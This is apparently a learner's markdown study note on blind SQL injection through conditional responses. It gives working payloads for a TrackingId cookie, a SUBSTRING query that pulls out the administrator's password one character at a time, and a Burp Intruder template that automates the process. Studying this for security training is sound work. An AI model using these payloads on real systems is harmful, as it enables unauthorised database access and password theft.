# Blind SQL Injection - Conditional Responses

## Overview

Blind SQL injection occurs when the application is vulnerable to SQL injection, but the HTTP response does not directly contain the results of the injected query.

In conditional response attacks, we determine whether a SQL condition is TRUE or FALSE by observing a difference in the application's response.

---

## Detecting a Conditional Response

A common example is a `TrackingId` cookie.

TRUE condition:

    TrackingId=xyz' AND '1'='1

FALSE condition:

    TrackingId=xyz' AND '1'='2

If the application responds differently, this can indicate a blind SQL injection vulnerability.

For example:

    TRUE  → "Welcome back"
    FALSE → "Welcome back" is not displayed

The response itself does not show the database result. Instead, the change in application behavior tells us whether the condition was TRUE or FALSE.

---

## Extracting Data Character by Character

Once a conditional response is confirmed, we can use SQL conditions to extract information one character at a time.

Example:

    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm

The important part is:

    SUBSTRING(..., 1, 1)

This means:

    Start at position 1
    Take 1 character

The `'m'` is the value being used as the comparison point.

By changing the condition and observing the application's response, we can determine the value of individual characters.

---

## Using Burp Intruder

Burp Intruder can automate character testing.

Example payload:

    xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'

The `§a§` marks the character position that will be replaced by Intruder payloads.

Possible payloads can include:

    a
    b
    c
    ...
    z
    0
    1
    2
    ...
    9

The application's response can then be used to identify the correct character.

After finding the first character, the position is changed:

    SUBSTRING(password,2,1)

Then:

    SUBSTRING(password,3,1)

And so on.

---

## Practical Workflow

    1. Identify a possible blind SQL injection
            ↓
    2. Create a TRUE condition
            ↓
    3. Create a FALSE condition
            ↓
    4. Compare the application responses
            ↓
    5. Confirm the conditional behavior
            ↓
    6. Extract data one character at a time
            ↓
    7. Automate character testing with Burp Intruder

---

## Key Takeaways

- Blind SQLi does not directly return the SQL query result.
- Conditional responses allow us to infer information from application behavior.
- TRUE and FALSE conditions can be compared to confirm the vulnerability.
- `SUBSTRING()` can be used to extract data character by character.
- Burp Intruder can automate the character enumeration process.